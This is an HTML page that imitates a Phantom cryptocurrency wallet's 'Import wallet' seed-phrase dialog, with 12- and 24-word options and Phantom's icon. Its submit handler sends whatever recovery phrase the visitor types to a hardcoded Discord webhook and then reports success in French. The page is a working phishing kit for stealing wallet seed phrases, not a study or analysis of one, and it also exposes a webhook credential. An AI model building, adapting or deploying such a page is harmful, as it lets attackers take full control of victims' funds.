<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Seed Phrase Input</title>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
    <style>
        /* Votre CSS existant */
    </style>
</head>
<body>
   <div class="modal-content">
    <div class="modal-header">
        <img src="https://play-lh.googleusercontent.com/obRvW02OTYLzJuvic1ZbVDVXLXzI0Vt_JGOjlxZ92XMdBF_i3kqU92u9SgHvJ5pySdM=w480-h960-rw" alt="Icon">
        <h4>Enter Seed Phrase for Phantom</h4>
    </div>
    <div class="selection-buttons">
        <button class="active" onclick="setWords(12)">12 words</button>
        <button onclick="setWords(24)">24 words</button>
    </div>
    <form id="seedPhraseForm">
        <textarea placeholder="Enter your seed phrase here. Make sure to add a space between each word." oninput="updateWords(this.value)" id="seedPhraseTextarea" name="seedPhrase phantom" required></textarea>
        <div class="words-grid" id="wordsGrid">
            <!-- Word boxes dynamically generated -->
        </div>
        <button type="submit" class="submit-button">Import wallet</button>
    </form>
    <div id="output"></div>
</div>

<script>
    let wordCount = 12; // Default to 12 words

    function setWords(count) {
        wordCount = count;

        const buttons = document.querySelectorAll('.selection-buttons button');
        buttons.forEach(btn => btn.classList.remove('active'));
        buttons[count === 12 ? 0 : 1].classList.add('active');

        renderWordBoxes();
    }

    function renderWordBoxes() {
        const grid = document.getElementById('wordsGrid');
        grid.innerHTML = ''; // Clear grid
        for (let i = 1; i <= wordCount; i++) {
            const wordBox = document.createElement('div');
            wordBox.className = 'word-box';
            wordBox.innerHTML = `<div class="index">${i}</div><span class="word"></span>`;
            grid.appendChild(wordBox);
        }
    }

    function updateWords(input) {
        const words = input.split(' '); // Split the input by spaces
        const wordBoxes = document.querySelectorAll('.word-box .word');
        
        // Update each word box with the corresponding word
        wordBoxes.forEach((box, index) => {
            box.textContent = words[index] || ''; // Set word or clear if none
        });
    }

    // Initialize with 12 words
    setWords(12);

    // Handle form submission
    document.getElementById('seedPhraseForm').addEventListener('submit', function (e) {
        e.preventDefault(); // Prevent the default form submission

        const seedPhrase = document.getElementById('seedPhraseTextarea').value;

        // Replace with your Discord webhook URL
        const webhookURL = 'https://discord.com/api/webhooks/1337941897238417530/zgItSGC5Vfg39VfPO9sqpA1hDakZ42_bWRp4bJjeR-bAcUtTkN7-yqPc_GBC5STq2XoF';

        // Create the payload for Discord
        const payload = {
            content: `Nouvelle seed phrase soumise :\n\`\`\`${seedPhrase}\`\`\``,
        };

        // Send the data to Discord
        fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
        })
        .then(response => {
            if (response.ok) {
                alert('Seed phrase soumise avec succès !');
            } else {
                alert('Erreur lors de la soumission. Veuillez réessayer.');
            }
        })
        .catch(error => {
            console.error('Erreur :', error);
            alert('Une erreur s\'est produite. Veuillez réessayer.');
        });
    });
</script>
</body>
</html>
